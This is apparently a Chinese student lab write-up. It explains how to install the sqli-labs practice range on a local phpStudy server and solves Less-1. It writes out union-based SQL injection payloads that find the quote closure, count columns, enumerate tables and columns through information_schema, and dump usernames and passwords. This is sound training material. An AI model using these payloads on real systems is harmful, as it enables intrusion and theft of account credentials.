任务三

Sqllabs靶场搭建

在网站中下载 sqllabs 压缩包，解压缩至小皮 php 中的 localhost 中的根目
录，压缩完成后，打开 sqli-labs-master 并改名为 sql 在里面中找到 sqli-
connections 并以记事本的方式打开 db-creds.inc，打开后将$dbpass=‘’改为
$dbpass=‘114514’并保存，将$dbuser=’’改为$dbuser=’security’ 将 localhost 的
根目录改为 sql，之后浏览器打开 127.0.0.1 即可。

Less1

型，使用?id=1’判断出闭合方式是’ ， 之后使用 order by 4–+,order by 3–+
查询出有 3 个列，使用联合注入 union select 1,2,3–+（?id =-1’让其第一行不
显示） 找回显位，union select 1,2,group_concat(table_name) from
information_schema.tables where table_schema=database()–+查表名，查询出
emails,referers,uagents,users，我需信息估计在 users 中，union select
1,2,group_concat(column_name) from information_schema.columns where
table_schema=database() and table_name=’users’–+ 查列名
id,username,password 之后使用 union select
1,2,group_concat(username,’~’,assword) from users–+查出账号和密码
